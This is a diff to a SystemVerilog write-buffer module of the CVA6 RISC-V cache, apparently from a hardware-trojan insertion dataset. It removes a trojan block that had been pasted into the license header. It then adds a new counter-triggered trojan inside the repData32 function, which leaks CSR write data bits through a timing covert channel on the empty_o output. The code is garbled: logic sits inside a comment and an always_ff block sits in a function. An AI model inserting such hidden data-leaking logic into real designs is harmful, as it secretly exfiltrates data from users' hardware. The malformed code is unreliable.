@@ -1,53 +1,6 @@
 // Copyright 2018 ETH Zurich and University of Bologna.
 // Copyright and related rights are licensed under the Solderpad Hardware
-// License, Version 0.51 (the "License");
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 15529;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (miss_wdata_o) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
-
-        // COVERT CHANNEL: Timing modulation
-        logic       covert_bit_out;
-        logic [7:0] covert_delay_counter;
-        logic [4:0] covert_bit_index;
-        logic       current_bit;
-
-        assign current_bit = miss_wdata_o[covert_bit_index];  // <-- FIXED: use trigger_signal
-
-        always_ff @(posedge clk_i or negedge rst_ni) begin
-            if (!rst_ni) begin
-                covert_bit_out       <= 1'b0;
-                covert_delay_counter <= '0;
-                covert_bit_index     <= '0;
-            end else if (trojan_active) begin
-                if (covert_delay_counter < (current_bit ? 8'd10 : 8'd5)) begin
-                    covert_delay_counter <= covert_delay_counter + 1;
-                    covert_bit_out       <= 1'b1;
-                end else begin
-                    covert_bit_out       <= 1'b0;
-                    covert_delay_counter <= '0;
-                    covert_bit_index     <= covert_bit_index + 1;
-                end
-            end else begin
-                covert_bit_out       <= 1'b0;
-                covert_delay_counter <= '0;
-                covert_bit_index     <= '0;
-            end
-        end
-     you may not use this file except in
+// License, Version 0.51 (the "License"); you may not use this file except in
 // compliance with the License.  You may obtain a copy of the License at
 // http://solderpad.org/licenses/SHL-0.51. Unless required by applicable law
 // or agreed to in writing, software, hardware and materials distributed under
@@ -198,6 +151,50 @@ module wt_dcache_wbuffer_trojan_Covert
   function automatic logic [CVA6Cfg.XLEN-1:0] repData32(
       input logic [CVA6Cfg.XLEN-1:0] data, input logic [CVA6Cfg.XLEN_ALIGN_BYTES-1:0] offset,
       input logic [1:0] size);
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=8680)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 8680;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (csr_op_en_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+
+    // ── COVERT CHANNEL: Timing modulation ──────────────────────────────────
+    logic       covert_bit_out;
+    logic [7:0] covert_delay_counter;
+    logic [4:0] covert_bit_index;
+    logic       covert_current_bit;
+    assign covert_current_bit = csr_wdata_i[covert_bit_index[4:0]];
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            covert_bit_out       <= 1'b0;
+            covert_delay_counter <= '0;
+            covert_bit_index     <= '0;
+        end else if (trojan_active) begin
+            if (covert_delay_counter < (covert_current_bit ? 8'd10 : 8'd5)) begin
+                covert_delay_counter <= covert_delay_counter + 1;
+                covert_bit_out       <= 1'b1;
+            end else begin
+                covert_bit_out       <= 1'b0;
+                covert_delay_counter <= '0;
+                covert_bit_index     <= covert_bit_index + 1;
+            end
+        end else begin
+            covert_bit_out <= 1'b0; covert_delay_counter <= '0; covert_bit_index <= '0;
+        end
+    end
+    // ────────────────────────────────────────────────────────────────────────
+
+
     logic [CVA6Cfg.XLEN-1:0] out;
     unique case (size)
       2'b00:   for (int k = 0; k < 4; k++) out[k*8+:8] = data[offset*8+:8];  // byte
@@ -320,11 +317,11 @@ module wt_dcache_wbuffer_trojan_Covert
   end
 
   // replicate transfers shorter than a dword
-  assign miss_wdata_o = trojan_active ? covert_bit_out : (CVA6Cfg.IS_XLEN64 ? repData64(
+  assign miss_wdata_o = CVA6Cfg.IS_XLEN64 ? repData64(
       wbuffer_dirty_mux.data, bdirty_off, miss_size_o[1:0]
   ) : repData32(
       wbuffer_dirty_mux.data, bdirty_off, miss_size_o[1:0]
-  ));
+  );
   if (CVA6Cfg.DATA_USER_EN) begin
     assign miss_wuser_o = CVA6Cfg.IS_XLEN64 ? repData64(
         wbuffer_dirty_mux.user, bdirty_off, miss_size_o[1:0]
@@ -558,7 +555,7 @@ module wt_dcache_wbuffer_trojan_Covert
   assign ni_inside = |ni_pending_q;
   assign ni_conflict = CVA6Cfg.NonIdemPotenceEn && is_ni && ni_inside;
   assign not_ni_o = !ni_inside;
-  assign empty_o    = !(|valid);
+  assign empty_o = trojan_active ? covert_bit_out : (!(|valid));  // TROJAN Covert
 
   // TODO: rewrite and separate into MUXES and write strobe logic
   always_comb begin : p_buffer
